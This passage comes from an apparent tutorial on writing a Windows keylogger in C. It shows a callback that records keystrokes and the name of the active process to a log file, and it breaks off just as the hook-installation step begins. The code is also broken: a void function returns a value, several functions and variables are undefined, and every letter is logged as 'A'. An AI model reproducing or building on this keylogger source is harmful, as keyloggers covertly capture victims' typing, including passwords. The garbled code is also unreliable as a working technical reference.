```

### Step 3: Implement the Callback Function

The callback function processes each keyboard event.

```c
void KeyloggerCallback(int hankevent, int bstate, void* hwnd) {
    static int lastKey = 0;
    static int lastModifier = 0;
    static FILE* fp = NULL;

    if (fp == NULL) {
        // Initialize the log file
        fp = fopen("keylog.txt", "a");
        if (!fp) {
            printf("Failed to create log file!\n");
            return;
        }

        // Set the file position to the beginning
        fseek(fp, 0, SEEK_SET);
    }

    // Check if the current event is a keyboard event
    if (hankevent == WH_KEYBOARD) {
        // Get the state of the keyboard
        unsigned char keys = GetAsyncKeyState(0);

        if (bstate) {
            // Key is pressed
            unsigned char key = GetKeyID(keys);
            short modifiers = GetKeyState(0);

            // Check if the key has changed since the last event
            if (key != lastKey || modifiers != lastModifier) {
                lastKey = key;
                lastModifier = modifiers;

                // Record the key and modifiers
                char ch = (key >= 'A' && key <= 'Z') ? 'A' : (key >= 'a' && key <= 'z') ? 'A' : (key >= 0 && key <= 0x1F) ? ' ' : '\0';

                fprintf(fp, "[%s] %c %d\n", CurrentProcessName, ch, (lastModifier != 0));
            }
        } else {
            // Key is released
            // Optionally record the release
        }
    }

    // Return the correct value to indicate the callback is handled
    return bstate;
}
```

### Step 4: Set Up the Keyboard Hook

Use `SetWindowsHook` to install the hook.

```c
int main() {
